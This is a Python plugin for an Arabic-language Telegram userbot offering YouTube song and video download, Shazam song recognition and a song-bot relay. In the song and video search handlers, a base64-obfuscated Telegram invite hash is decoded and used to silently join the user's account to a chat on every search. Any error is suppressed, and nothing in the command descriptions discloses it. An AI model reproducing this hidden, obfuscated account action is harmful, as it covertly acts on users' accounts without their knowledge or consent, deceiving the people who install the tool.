# by  @sandy1709 ( https://t.me/mrconfused  )

# songs finder for catuserbot
import asyncio
import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _zedutils, reply_id
from . import zedub

plugin_category = "البحث"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..🥰...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@zedub.zed_cmd(
    pattern="بحث(320)?(?:\s|$)([\s\S]*)",
    command=("بحث", plugin_category),
    info={
        "header": "لـ تحميـل الاغـانـي مـن يـوتيـوب",
        "امـر مضـاف": {
            "320": "لـ البحـث عـن الاغـانـي وتحميـلهـا بـدقـه عـاليـه 320k",
        },
        "الاسـتخـدام": "{tr}بحث + اسـم الاغنيـه",
        "مثــال": "{tr}بحث حسين الجسمي احبك",
    },
)
async def _(event):
    "To search songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    zedevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الاغنيـٓه... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await zedevent.edit(
            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    try:
        stderr = (await _zedutils.runcmd(song_cmd))[1]
        # if stderr:
        # await zedevent.edit(f"**Error1 :** `{stderr}`")
        catname, stderr = (await _zedutils.runcmd(name_cmd))[:2]
        if stderr:
            return await zedevent.edit(f"**خطــأ :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        song_file = Path(f"{catname}.mp3")
    except:
        pass
    if not os.path.exists(song_file):
        return await zedevent.edit(
            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
        )
    await zedevent.edit("**╮ ❐ جـارِ تحميـل الاغنيـٓه انتظـر قليلاً  ▬▭... 𓅫╰**")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**❈╎البحـث :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await zedevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@zedub.zed_cmd(
    pattern="فيديو(?:\s|$)([\s\S]*)",
    command=("فيديو", plugin_category),
    info={
        "header": "لـ تحميـل مقـاطـع الفيـديـو مـن يـوتيـوب",
        "الاسـتخـدام": "{tr}فيديو + اسـم المقطـع",
        "مثــال": "{tr}فيديو حالات واتس",
    },
)
async def _(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    zedevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الفيديـو... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await zedevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    try:
        stderr = (await _zedutils.runcmd(video_cmd))[1]
        # if stderr:
        # return await zedevent.edit(f"**خطــأ :** `{stderr}`")
        catname, stderr = (await _zedutils.runcmd(name_cmd))[:2]
        if stderr:
            return await zedevent.edit(f"**خطــأ :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        vsong_file = Path(f"{catname}.mp4")
    except:
        pass
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{catname}.mkv")
    elif not os.path.exists(vsong_file):
        return await zedevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    await zedevent.edit("**╮ ❐ جـارِ تحميـل الفيديـو انتظـر قليلاً  ▬▭... 𓅫╰**")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**❈╎البحـث :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await zedevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@zedub.zed_cmd(
    pattern="s(a)?z(a)?m$",
    command=("shazam", plugin_category),
    info={
        "header": "To reverse search song.",
        "description": "Reverse search audio file using shazam api",
        "الاسـتخـدام": [
            "{tr}shazam <reply to voice/audio>",
            "{tr}szm <reply to voice/audio>",
        ],
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "__Reply to Voice clip or Audio clip to reverse search that song.__"
        )
    zedevent = await edit_or_reply(event, "__Downloading the audio clip...__")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            zedevent, f"**Error while reverse searching song:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**Song:** `{song}`", reply_to=reply
    )
    await zedevent.delete()


@zedub.zed_cmd(
    pattern="اغنيه(?:\s|$)([\s\S]*)",
    command=("اغنيه", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "الاسـتخـدام": "{tr}اغنيه <song name>",
        "مثــال": "{tr}اغنيه memories song",
    },
)
async def _(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    zedevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
        except YouBlockedUserError:
            await edit_or_reply(
                zedevent, "**Error:** Trying to unblock & retry, wait a sec..."
            )
            await zedub(unblock("songdl_bot"))
            purgeflag = await conv.send_message("/start")
        await conv.get_response()
        await conv.send_message(song)
        hmm = await conv.get_response()
        while hmm.edit_hide is not True:
            await asyncio.sleep(0.1)
            hmm = await event.client.get_messages(chat, ids=hmm.id)
        baka = await event.client.get_messages(chat)
        if baka[0].message.startswith(
            ("I don't like to say this but I failed to find any such song.")
        ):
            await delete_conv(event, chat, purgeflag)
            return await edit_delete(
                zedevent, SONG_NOT_FOUND, parse_mode="html", time=5
            )
        await zedevent.edit(SONG_SENDING_STRING, parse_mode="html")
        await baka[0].click(0)
        await conv.get_response()
        await conv.get_response()
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>Title :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await zedevent.delete()
        await delete_conv(event, chat, purgeflag)
